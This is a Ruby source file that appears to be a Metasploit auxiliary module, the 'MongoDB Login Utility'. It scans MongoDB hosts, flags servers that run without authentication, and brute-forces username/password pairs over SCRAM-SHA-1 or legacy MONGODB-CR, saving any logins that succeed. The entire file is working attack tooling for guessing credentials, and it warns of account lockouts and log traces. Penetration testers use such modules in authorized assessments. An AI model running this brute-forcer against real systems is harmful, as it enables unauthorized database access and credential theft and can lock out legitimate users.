##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Mongodb
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Login Utility',
        'Description' => %q{
          This module attempts to brute force authentication credentials for MongoDB.
          It supports both SCRAM-SHA-1 (MongoDB 3.0+) and falls back to legacy
          MONGODB-CR authentication if SCRAM is unsupported by the target server.

          Successfully tested against MongoDB 3.6.23, 4.4.30, 5.0.33, 6.0.28, 7.0.43, 8.3.11
          with and without authentication
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ]
        ],
        'Author' => [
          'Gregory Man <man.gregory[at]gmail.com>',
          'h00die', # SCRAM and updating compatibility for MongoDB 3.0+ and later
          'prithvee07'
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => [],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS]
        }
      )
    )
  end

  def run_host(ip)
    print_status("Scanning IP: #{ip}")
    begin
      connect

      # Probe for enforced authentication before fetching the version:
      # get_version authenticates when a username is configured (MongoDB
      # 8.1+ gates buildInfo behind auth), which would leave this
      # connection authenticated and skew the auth-state probes.
      auth_state = mongodb_auth_state
      version = get_version
      ver_info = version ? " (version #{version})" : ''

      if auth_state == :absent
        report_vuln(
          host: rhost,
          port: rport,
          name: 'MongoDB No Authentication',
          refs: references,
          exploited_at: Time.now.utc,
          info: "Mongo server has no authentication.#{ver_info}"
        )
        print_good("Mongo server #{ip}#{ver_info} doesn't use authentication")
      else
        if auth_state == :unknown
          print_status("Mongo server#{ver_info} authentication state is not detectable over the legacy wire protocol (MongoDB 6.0-8.0); attempting credentials anyway")
        else
          print_status("Mongo server#{ver_info} requires authentication")
        end
        each_user_pass do |user, pass|
          do_login(user, pass)
        end
      end
      disconnect
    rescue StandardError => e
      print_error "Unable to connect: #{e}"
    ensure
      disconnect
    end
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")

    mechanism = authenticate(user: user, pass: password)
    return nil unless mechanism

    print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (#{mechanism})")
    report_cred(
      ip: rhost,
      port: rport,
      service_name: 'mongodb',
      user: user,
      password: password,
      proof: "authenticated via #{mechanism}"
    )
    :next_user
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
